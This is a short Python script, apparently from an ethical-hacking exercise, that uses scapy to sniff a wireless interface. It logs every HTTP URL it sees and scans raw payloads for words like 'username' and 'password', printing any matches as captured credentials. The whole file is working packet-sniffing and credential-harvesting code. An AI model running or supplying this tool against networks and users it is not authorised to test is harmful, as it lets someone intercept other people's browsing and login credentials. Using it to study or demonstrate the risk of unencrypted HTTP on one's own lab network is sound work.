#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)
    #stor=flase states that dont save the packets to avoid loss

def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def getlogininfo(packet):
    if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
        #raw code and load is where the login fields are present
            keywords=['username','uname','login','user','password','pass']
            for keyword in keywords:
                if keyword in load:
                    return load
                    

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        print("HTTP Request >>"+url)#get all the urls accesed
        login_info=getlogininfo(packet)
        if login_info:
            print("\n\nPossible Usernames and Passowrd " +login_info +"\n\n")
        

sniff("wlp3s0")